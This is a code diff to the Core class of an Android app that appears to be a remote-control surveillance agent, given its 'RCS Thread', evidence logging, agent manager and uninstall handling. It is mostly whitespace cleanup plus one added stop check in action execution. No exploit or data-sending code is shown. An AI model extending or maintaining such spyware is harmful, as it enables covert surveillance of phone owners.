@@ -65,7 +65,7 @@ public class Core extends Activity implements Runnable {
 	private Thread fastQueueThread;
 	private CheckAction checkActionFast;
 	private PendingIntent alarmIntent = null;
-	
+
 	/**
 	 * Start.
 	 * 
@@ -81,10 +81,10 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (Start): service already running"); //$NON-NLS-1$
 			}
-			
+
 			return false;
 		}
-		
+
 		coreThread = new Thread(this);
 
 		agentManager = ManagerAgent.self();
@@ -116,7 +116,7 @@ public class Core extends Activity implements Runnable {
 		wl.acquire();
 
 		Evidence.info(Messages.getString("30.1")); //$NON-NLS-1$
-		
+
 		serviceRunning = true;
 		return true;
 	}
@@ -128,15 +128,15 @@ public class Core extends Activity implements Runnable {
 	 */
 	public boolean Stop() {
 		bStopCore = true;
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " RCS Thread Stopped"); //$NON-NLS-1$
 		}
-		
+
 		wl.release();
 
-		coreThread=null;
-		
+		coreThread = null;
+
 		serviceRunning = false;
 		return true;
 	}
@@ -144,7 +144,7 @@ public class Core extends Activity implements Runnable {
 	public static boolean isServiceRunning() {
 		return serviceRunning;
 	}
-	
+
 	// Runnable (main routine for RCS)
 	/*
 	 * (non-Javadoc)
@@ -175,7 +175,8 @@ public class Core extends Activity implements Runnable {
 					Check.log(TAG + " Info: starting checking actions"); //$NON-NLS-1$
 				}
 
-				// Torna true in caso di UNINSTALL o false in caso di stop del servizio
+				// Torna true in caso di UNINSTALL o false in caso di stop del
+				// servizio
 				checkActions();
 
 				if (Cfg.DEBUG) {
@@ -272,7 +273,7 @@ public class Core extends Activity implements Runnable {
 				Check.log(ex);//$NON-NLS-1$
 				Check.log(TAG + " FATAL: checkActions error, restart: " + ex); //$NON-NLS-1$
 			}
-			
+
 			return false;
 		}
 	}
@@ -575,6 +576,13 @@ public class Core extends Activity implements Runnable {
 					}
 
 					continue;
+				} else {
+					if (subAction.considerStop()) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (executeAction): stop" );
+						}
+						break;
+					}
 				}
 			} catch (final Exception ex) {
 				if (Cfg.EXCEPTION) {
@@ -614,7 +622,7 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (reloadConf): valid conf");
 			}
-			
+
 			stopAll();
 
 			int ret = taskInit();
